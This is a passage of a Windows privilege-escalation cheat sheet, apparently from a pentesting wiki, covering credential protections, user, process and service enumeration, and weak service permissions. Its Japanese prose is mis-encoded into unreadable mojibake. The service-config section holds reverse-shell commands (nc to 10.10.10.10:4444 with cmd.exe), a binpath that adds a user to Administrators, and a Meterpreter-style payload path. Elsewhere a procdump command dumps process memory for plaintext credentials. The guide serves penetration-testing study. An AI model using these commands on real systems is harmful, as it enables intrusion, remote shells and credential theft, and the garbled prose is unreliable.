reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingï¼ˆWindows ã‚¤ãƒ™ãƒ³ãƒˆè»¢é€ï¼‰ã¯ã€ãƒ­ã‚°ãŒã©ã“ã«é€ä¿¡ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’çŸ¥ã‚‹ãŸã‚ã«èˆˆå‘³æ·±ã„ã§ã™ã€‚
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã«å‚åŠ ã—ã¦ã„ã‚‹ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ä¸Šã®**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ç®¡ç†**ã‚’ç›®çš„ã¨ã—ã¦ãŠã‚Šã€å„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒ**ä¸€æ„ã§ãƒ©ãƒ³ãƒ€ãƒ åŒ–ã•ã‚Œã€å®šæœŸçš„ã«æ›´æ–°**ã•ã‚Œã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯Active Directoryå†…ã§å®‰å…¨ã«ä¿å­˜ã•ã‚Œã€ACLã‚’ä»‹ã—ã¦ååˆ†ãªæ¨©é™ãŒä»˜ä¸ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã€èªå¯ã•ã‚ŒãŸå ´åˆã«ã®ã¿ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¡¨ç¤ºã§ãã¾ã™ã€‚

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

**WDigest**ãŒæœ‰åŠ¹ãªå ´åˆã€**å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒLSASS**ï¼ˆLocal Security Authority Subsystem Serviceï¼‰ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚\
[**WDigestã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã“ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§**](../stealing-credentials/credentials-protections.md#wdigest)ã€‚
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**ã‹ã‚‰ã¯ã˜ã‚ã¦ã€Microsoftã¯ãƒ­ãƒ¼ã‚«ãƒ«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿé–¢ï¼ˆLSAï¼‰ã®ãƒ¡ãƒ¢ãƒªã‚’èª­ã¿å–ã‚ã†ã¨ã™ã‚‹ä¿¡é ¼ã•ã‚Œã¦ã„ãªã„ãƒ—ãƒ­ã‚»ã‚¹ã®è©¦ã¿ã‚„ã‚³ãƒ¼ãƒ‰ã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ãŸã‚ã«ã€å¼·åŒ–ã•ã‚ŒãŸä¿è­·ã‚’å°å…¥ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã‚’ã•ã‚‰ã«ã‚»ã‚­ãƒ¥ã‚¢ã«ã—ã¾ã—ãŸã€‚\
[**LSA Protectionã«é–¢ã™ã‚‹è©³ç´°ã¯ã“ã¡ã‚‰**](../stealing-credentials/credentials-protections.md#lsa-protection)ã€‚
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### è³‡æ ¼æƒ…å ±ã‚¬ãƒ¼ãƒ‰

**è³‡æ ¼æƒ…å ±ã‚¬ãƒ¼ãƒ‰**ã¯**Windows 10**ã«å°å…¥ã•ã‚Œã¾ã—ãŸã€‚ãã®ç›®çš„ã¯ã€ãƒ‡ãƒã‚¤ã‚¹ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹è³‡æ ¼æƒ…å ±ã‚’ãƒãƒƒã‚·ãƒ¥ã®ç›—ç”¨æ”»æ’ƒãªã©ã®è„…å¨ã‹ã‚‰ä¿è­·ã™ã‚‹ã“ã¨ã§ã™ã€‚[**è³‡æ ¼æƒ…å ±ã‚¬ãƒ¼ãƒ‰ã«é–¢ã™ã‚‹è©³ç´°ã¯ã“ã¡ã‚‰ã€‚**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±

**ãƒ‰ãƒ¡ã‚¤ãƒ³è³‡æ ¼æƒ…å ±**ã¯**ãƒ­ãƒ¼ã‚«ãƒ«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿé–¢**ï¼ˆLSAï¼‰ã«ã‚ˆã£ã¦èªè¨¼ã•ã‚Œã€ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã‚ˆã£ã¦åˆ©ç”¨ã•ã‚Œã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ã‚°ã‚ªãƒ³ãƒ‡ãƒ¼ã‚¿ãŒç™»éŒ²ã•ã‚ŒãŸã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã«ã‚ˆã£ã¦èªè¨¼ã•ã‚Œã‚‹ã¨ã€é€šå¸¸ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã®ãƒ‰ãƒ¡ã‚¤ãƒ³è³‡æ ¼æƒ…å ±ãŒç¢ºç«‹ã•ã‚Œã¾ã™ã€‚\
[**ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã«é–¢ã™ã‚‹è©³ç´°ã¯ã“ã¡ã‚‰**](../stealing-credentials/credentials-protections.md#cached-credentials)ã€‚
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼†ã‚°ãƒ«ãƒ¼ãƒ—

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼†ã‚°ãƒ«ãƒ¼ãƒ—ã®åˆ—æŒ™

èˆˆå‘³æ·±ã„æ¨©é™ã‚’æŒã¤å¯èƒ½æ€§ã®ã‚ã‚‹ã‚°ãƒ«ãƒ¼ãƒ—ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—

**ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—ã«æ‰€å±ã—ã¦ã„ã‚‹å ´åˆã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—ã«ã¤ã„ã¦å­¦ã³ã€ç‰¹æ¨©æ˜‡æ ¼ã«æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### ãƒˆãƒ¼ã‚¯ãƒ³æ“ä½œ

**ãƒˆãƒ¼ã‚¯ãƒ³**ã¨ã¯ä½•ã‹ã«ã¤ã„ã¦è©³ã—ãå­¦ã¶ã«ã¯ã€ã“ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š[**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
èˆˆå‘³æ·±ã„ãƒˆãƒ¼ã‚¯ãƒ³ã«ã¤ã„ã¦å­¦ã³ã€ãã‚Œã‚‰ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### ãƒ­ã‚°ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ / ã‚»ãƒƒã‚·ãƒ§ãƒ³
```bash
qwinsta
klist sessions
```
### ãƒ›ãƒ¼ãƒ ãƒ•ã‚©ãƒ«ãƒ€
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼
```bash
net accounts
```
### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®å†…å®¹ã‚’å–å¾—ã—ã¾ã™
```bash
powershell -command "Get-Clipboard"
```
## å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹

### ãƒ•ã‚¡ã‚¤ãƒ«ãŠã‚ˆã³ãƒ•ã‚©ãƒ«ãƒ€ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™

ã¾ãšã€ãƒ—ãƒ­ã‚»ã‚¹ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã¦ã€**ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³å†…ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ãªã„ã‹**ã‚’ç¢ºèªã—ã¾ã™ã€‚\
å®Ÿè¡Œä¸­ã®ãƒã‚¤ãƒŠãƒªã‚’**ä¸Šæ›¸ãã§ãã‚‹ã‹**ã€ã¾ãŸã¯ãƒã‚¤ãƒŠãƒªãƒ•ã‚©ãƒ«ãƒ€ã«æ›¸ãè¾¼ã¿æ¨©é™ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€å¯èƒ½ãª[**DLLãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯æ”»æ’ƒ**](dll-hijacking/)ã‚’æ‚ªç”¨ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
å¸¸ã«å®Ÿè¡Œä¸­ã®[**electron/cef/chromium debuggers**ã‚’ç¢ºèªã—ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«æ‚ªç”¨ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)ã€‚

**ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒã‚¤ãƒŠãƒªã®æ¨©é™ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒã‚¤ãƒŠãƒªãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ï¼ˆ**[**DLLãƒã‚¤ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°**](dll-hijacking/)**ï¼‰**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### ãƒ¡ãƒ¢ãƒªãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒã‚¤ãƒ‹ãƒ³ã‚°

**Sysinternals** ã® **procdump** ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ¡ãƒ¢ãƒªãƒ¼ãƒ€ãƒ³ãƒ—ã‚’ä½œæˆã§ãã¾ã™ã€‚FTPã®ã‚ˆã†ãªã‚µãƒ¼ãƒ“ã‚¹ã§ã¯ã€**ãƒ¡ãƒ¢ãƒªãƒ¼å†…ã«å¹³æ–‡ã§è³‡æ ¼æƒ…å ±ãŒä¿å­˜**ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãƒ¡ãƒ¢ãƒªãƒ¼ãƒ€ãƒ³ãƒ—ã‚’ä½œæˆã—ã¦è³‡æ ¼æƒ…å ±ã‚’èª­ã¿å–ã£ã¦ã¿ã¦ãã ã•ã„ã€‚
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±ãªGUIã‚¢ãƒ—ãƒª

**SYSTEMã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒCMDã‚’ç”Ÿæˆã—ãŸã‚Šã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å‚ç…§ã—ãŸã‚Šã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**

ä¾‹: "Windowsãƒ˜ãƒ«ãƒ—ã¨ã‚µãƒãƒ¼ãƒˆ" (Windows + F1)ã€"ã‚³ãƒãƒ³ãƒ‰ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆ"ã‚’æ¤œç´¢ã—ã€"ã‚¯ãƒªãƒƒã‚¯ã—ã¦ã‚³ãƒãƒ³ãƒ‰ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã‚’é–‹ã"ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚

## ã‚µãƒ¼ãƒ“ã‚¹

ã‚µãƒ¼ãƒ“ã‚¹ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### æ¨©é™

**sc**ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã®æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚
```bash
sc qc <service_name>
```
ä»¥ä¸‹ã¯ã€_Sysinternals_ ã‹ã‚‰ **accesschk** ã¨ã„ã†ãƒã‚¤ãƒŠãƒªã‚’ä½¿ç”¨ã—ã¦ã€å„ã‚µãƒ¼ãƒ“ã‚¹ã®å¿…è¦ãªç‰¹æ¨©ãƒ¬ãƒ™ãƒ«ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¦ã„ã¾ã™ã€‚
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
æ¬¡ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¦ã€"Authenticated Users" ãŒã©ã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã‚‚å¤‰æ›´ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XPç”¨ã®accesschk.exeã‚’ã“ã¡ã‚‰ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### ã‚µãƒ¼ãƒ“ã‚¹ã®æœ‰åŠ¹åŒ–

ã“ã®ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¦ã„ã‚‹å ´åˆï¼ˆãŸã¨ãˆã°SSDPSRVã®å ´åˆï¼‰:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

æ¬¡ã®æ–¹æ³•ã§æœ‰åŠ¹åŒ–ã§ãã¾ã™:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ã‚µãƒ¼ãƒ“ã‚¹upnphostã¯ã€å‹•ä½œã™ã‚‹ãŸã‚ã«SSDPSRVã«ä¾å­˜ã—ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼ˆXP SP1ã®å ´åˆï¼‰**

**ã“ã®å•é¡Œã®åˆ¥ã®å›é¿ç­–**ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã™:
```
sc.exe config usosvc start= auto
```
### **ã‚µãƒ¼ãƒ“ã‚¹ã®ãƒã‚¤ãƒŠãƒªãƒ‘ã‚¹ã‚’å¤‰æ›´ã™ã‚‹**

"èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼"ã‚°ãƒ«ãƒ¼ãƒ—ãŒã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦**SERVICE\_ALL\_ACCESS**ã‚’æ‰€æœ‰ã—ã¦ã„ã‚‹å ´åˆã€ã‚µãƒ¼ãƒ“ã‚¹ã®å®Ÿè¡Œå¯èƒ½ãƒã‚¤ãƒŠãƒªã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚**sc**ã‚’å¤‰æ›´ã—ã¦å®Ÿè¡Œã™ã‚‹ã«ã¯ï¼š
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### ã‚µãƒ¼ãƒ“ã‚¹ã®å†èµ·å‹•
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
ç‰¹æ¨©ã¯ã•ã¾ã–ã¾ãªæ¨©é™ã‚’é€šã˜ã¦æ˜‡æ ¼ã§ãã¾ã™ï¼š

- **SERVICE\_CHANGE\_CONFIG**ï¼šã‚µãƒ¼ãƒ“ã‚¹ãƒã‚¤ãƒŠãƒªã®å†æ§‹æˆã‚’è¨±å¯ã—ã¾ã™ã€‚
- **WRITE\_DAC**ï¼šæ¨©é™ã®å†æ§‹æˆã‚’å¯èƒ½ã«ã—ã€ã‚µãƒ¼ãƒ“ã‚¹æ§‹æˆã®å¤‰æ›´ãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
- **WRITE\_OWNER**ï¼šæ‰€æœ‰æ¨©ã®å–å¾—ã¨æ¨©é™ã®å†æ§‹æˆã‚’è¨±å¯ã—ã¾ã™ã€‚
- **GENERIC\_WRITE**ï¼šã‚µãƒ¼ãƒ“ã‚¹æ§‹æˆã®å¤‰æ›´ãŒã§ãã‚‹èƒ½åŠ›ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚
- **GENERIC\_ALL**ï¼šã‚µãƒ¼ãƒ“ã‚¹æ§‹æˆã®å¤‰æ›´ãŒã§ãã‚‹èƒ½åŠ›ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã®æ¤œå‡ºã¨æ‚ªç”¨ã«ã¯ã€_exploit/windows/local/service\_permissions_ ã‚’åˆ©ç”¨ã§ãã¾ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹ãƒã‚¤ãƒŠãƒªã®æ¨©é™ãŒå¼±ã„

**ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ãƒã‚¤ãƒŠãƒªã‚’å¤‰æ›´ã§ãã‚‹ã‹ã©ã†ã‹**ã€ã¾ãŸã¯ãƒã‚¤ãƒŠãƒªãŒé…ç½®ã•ã‚Œã¦ã„ã‚‹ãƒ•ã‚©ãƒ«ãƒ€ã«**æ›¸ãè¾¼ã¿æ¨©é™ãŒã‚ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼ˆ[**DLL Hijacking**](dll-hijacking/)ï¼‰ã€‚\
**wmic**ï¼ˆsystem32 ä»¥å¤–ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã™ã¹ã¦ã®ãƒã‚¤ãƒŠãƒªã‚’å–å¾—ã—ã€**icacls** ã‚’ä½¿ç”¨ã—ã¦æ¨©é™ã‚’ç¢ºèªã§ãã¾ã™ï¼š
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
ã‚ãªãŸã¯**sc**ã¨**icacls**ã‚‚ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### ã‚µãƒ¼ãƒ“ã‚¹ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®å¤‰æ›´æ¨©é™

ã‚µãƒ¼ãƒ“ã‚¹ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚’å¤‰æ›´ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
æ¬¡ã®ã‚ˆã†ã«ã—ã¦ã€ã‚µãƒ¼ãƒ“ã‚¹ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã«å¯¾ã™ã‚‹æ¨©é™ã‚’ç¢ºèªã§ãã¾ã™:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
æ¬¡ã®ã“ã¨ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚**Authenticated Users**ã¾ãŸã¯**NT AUTHORITY\INTERACTIVE**ãŒ`FullControl`æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã€‚ã‚‚ã—ãã†ãªã‚‰ã€ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ãƒã‚¤ãƒŠãƒªã‚’å¤‰æ›´ã§ãã¾ã™ã€‚

å®Ÿè¡Œã•ã‚Œã‚‹ãƒã‚¤ãƒŠãƒªã®ãƒ‘ã‚¹ã‚’å¤‰æ›´ã™ã‚‹ã«ã¯ï¼š
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### ã‚µãƒ¼ãƒ“ã‚¹ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®AppendData/AddSubdirectoryæ¨©é™

ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã«ã“ã®æ¨©é™ãŒã‚ã‚‹å ´åˆã€**ã“ã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‹ã‚‰ã‚µãƒ–ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚’ä½œæˆã§ãã¾ã™**ã€‚Windowsã‚µãƒ¼ãƒ“ã‚¹ã®å ´åˆã€ã“ã‚Œã¯**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã®ã«ååˆ†ã§ã™**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### å¼•ç”¨ç¬¦ã®ãªã„ã‚µãƒ¼ãƒ“ã‚¹ãƒ‘ã‚¹

å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ãƒ‘ã‚¹ãŒå¼•ç”¨ç¬¦ã§å›²ã¾ã‚Œã¦ã„ãªã„å ´åˆã€Windowsã¯ã‚¹ãƒšãƒ¼ã‚¹ã®å‰ã®ã™ã¹ã¦ã®çµ‚äº†ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

ãŸã¨ãˆã°ã€ãƒ‘ã‚¹ _C:\Program Files\Some Folder\Service.exe_ ã®å ´åˆã€Windowsã¯æ¬¡ã®ã‚ˆã†ã«å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã™:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
ä»¥ä¸‹ã¯ã€çµ„ã¿è¾¼ã¿ã®Windowsã‚µãƒ¼ãƒ“ã‚¹ã«å±ã•ãªã„ã™ã¹ã¦ã®å¼•ç”¨ç¬¦ã®ãªã„ã‚µãƒ¼ãƒ“ã‚¹ãƒ‘ã‚¹ã®ãƒªã‚¹ãƒˆã§ã™ï¼š
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
